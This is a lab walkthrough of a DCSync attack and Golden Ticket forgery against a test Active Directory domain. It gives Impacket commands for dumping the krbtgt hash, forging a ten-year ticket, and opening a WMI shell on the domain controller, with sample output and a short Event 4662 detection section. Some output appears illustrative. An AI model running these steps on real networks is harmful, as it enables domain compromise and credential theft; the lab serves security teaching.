# Lab 03: DCSync Attack & Domain Dominance with Golden Tickets

> **Lab Focus**: Comprehensive practical execution of the DCSync technique via MS-DRSR directory replication, extracting the master `krbtgt` Kerberos key, and forging persistent Golden Tickets for total forest dominance.

---

## 1. Laboratory Environment Setup

```
+-----------------------------------------------------------------------------------------+
| ACTIVE DIRECTORY DOMAIN TOPOLOGY                                                        |
|                                                                                         |
|  [ATTACK BOX]               [DOMAIN CONTROLLER]           [TARGET DOMAIN]               |
|  Kali Linux 2024.x          Windows Server 2022           CORP.LOCAL                    |
|  IP: 10.0.0.150             DC01.corp.local               Domain SID:                   |
|  Account: compromised_admin IP: 10.0.0.1                  S-1-5-21-3914562810-          |
|  Pass: AdminPass2024!       Roles: PDC Emulator, KDC      2856192837-1928374619         |
+-----------------------------------------------------------------------------------------+
```

* **Attacker Account**: `CORP\compromised_admin` (Holds Replication Rights or Domain Admin membership).
* **Target Account**: `krbtgt` (Key Distribution Center service account).

---

## 2. Phase 1: Executing DCSync with Impacket `secretsdump.py`

### Step 1: Perform Targeted DCSync against `krbtgt`
Rather than dumping thousands of users and causing severe network spikes, target `krbtgt` exclusively:

```bash
impacket-secretsdump 'corp.local/compromised_admin:AdminPass2024!@10.0.0.1' \
  -just-dc-user krbtgt
```

#### Terminal Execution:
```text
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9dde0148fa732e7f804562a0a28f8f2b:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:58a439df681829e1208a9c3d4e5f60718293a4b5c6d7e8f012345678abcdef01
krbtgt:aes128-cts-hmac-sha1-96:918273645a1b2c3d4e5f60718293a4b5
krbtgt:des-cbc-md5:8a7b6c5d4e3f2a1b
[*] Cleaning up...
```

* **Critical Data Extracted**:
  - `krbtgt` NT Hash: `9dde0148fa732e7f804562a0a28f8f2b`
  - `krbtgt` AES-256 Key: `58a439df681829e1208a9c3d4e5f60718293a4b5c6d7e8f012345678abcdef01`

---

## 3. Phase 2: Domain SID Enumeration

To forge a valid Kerberos ticket, the Domain Security Identifier (Domain SID) is required. Retrieve it using `lookupsid.py`:

```bash
impacket-lookupsid 'corp.local/compromised_admin:AdminPass2024!@10.0.0.1' 0
```

```text
[*] Domain SID is: S-1-5-21-3914562810-2856192837-1928374619
[*] 500: CORP\Administrator (SidTypeUser)
[*] 501: CORP\Guest (SidTypeUser)
[*] 502: CORP\krbtgt (SidTypeUser)
[*] 512: CORP\Domain Admins (SidTypeGroup)
[*] 519: CORP\Enterprise Admins (SidTypeGroup)
```

---

## 4. Phase 3: Forging a Golden Ticket with `ticketer.py`

Using `impacket-ticketer`, forge a master Ticket Granting Ticket (TGT) valid for **10 years**, awarding `Administrator` membership in `Domain Admins (512)`, `Enterprise Admins (519)`, and `Schema Admins (518)`:

```bash
impacket-ticketer \
  -domain corp.local \
  -domain-sid S-1-5-21-3914562810-2856192837-1928374619 \
  -aesKey 58a439df681829e1208a9c3d4e5f60718293a4b5c6d7e8f012345678abcdef01 \
  -user Administrator \
  -groups 512,513,518,519,520 \
  Administrator
```

#### Terminal Execution:
```text
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Creating basic skeleton ticket and PAC
[*] Customizing PAC for user: Administrator
[*] Adding groups: 512, 513, 518, 519, 520
[*] Encrypting PAC with server key: 58a439df... (AES-256)
[*] Encrypting ticket with KDC key: 58a439df... (AES-256)
[*] Saving ticket in Administrator.ccache
[+] Golden Ticket forged successfully!
```

---

## 5. Phase 4: Weaponizing the Golden Ticket

### Step 1: Export Ticket to Linux Environment
```bash
export KRB5CCNAME=Administrator.ccache
```

### Step 2: Access Domain Controller via WMIExec (Zero Plaintext Passwords)
```bash
impacket-wmiexec -k -no-pass 'corp.local/Administrator@dc01.corp.local'
```

#### Terminal Execution:
```text
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell through WMI...
[*] Installed command executor on target!

C:\Windows\system32> whoami
corp\administrator

C:\Windows\system32> whoami /groups
GROUP INFORMATION
-----------------
Group Name                                  Type             SID
=========================================== ================ =============================================
Everyone                                    Well-known group S-1-1-0
CORP\Domain Admins                          Group            S-1-5-21-3914562810-2856192837-1928374619-512
CORP\Enterprise Admins                      Group            S-1-5-21-3914562810-2856192837-1928374619-519
CORP\Schema Admins                          Group            S-1-5-21-3914562810-2856192837-1928374619-518
```

---

## 6. Phase 5: Troubleshooting Operator Issues

```
+------------------------------------+------------------------------------+---------------------------------------+
| Observed Problem                   | Root Cause                         | Solution / Workaround                 |
+------------------------------------+------------------------------------+---------------------------------------+
| secretsdump fails with error:      | Target user does not hold          | Grant replication rights or use a     |
| "Replication access was denied"    | DS-Replication-Get-Changes-All.    | compromised Domain Admin account.     |
+------------------------------------+------------------------------------+---------------------------------------+
| Ticket forged, but connection      | Kerberos requires FQDN matching    | Use 'dc01.corp.local' rather than IP  |
| fails with KDC_ERR_S_PRINCIPAL_    | rather than raw IP addresses.      | address '10.0.0.1'. Ensure entries in |
| UNKNOWN.                           |                                    | /etc/hosts match the domain name.     |
+------------------------------------+------------------------------------+---------------------------------------+
| Ticket rejected with               | Host time difference exceeds       | Run: rdate -n 10.0.0.1 to synchronize |
| KRB_AP_ERR_SKEW (0x25).            | 5 minutes.                         | attack machine clock.                 |
+------------------------------------+------------------------------------+---------------------------------------+
```

---

## 7. Phase 6: Defensive Verification & SIEM Telemetry

On Domain Controller `DC01`, verify the DCSync audit log:
* **Event ID 4662**: An operation was performed on an object.
  - **Object Server**: `DS`
  - **Object Type**: `domainDNS`
  - **Access Mask**: `0x100` (Control Access)
  - **Properties**: Contains `{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}` (`DS-Replication-Get-Changes-All`)
  - **Subject User Name**: `compromised_admin`
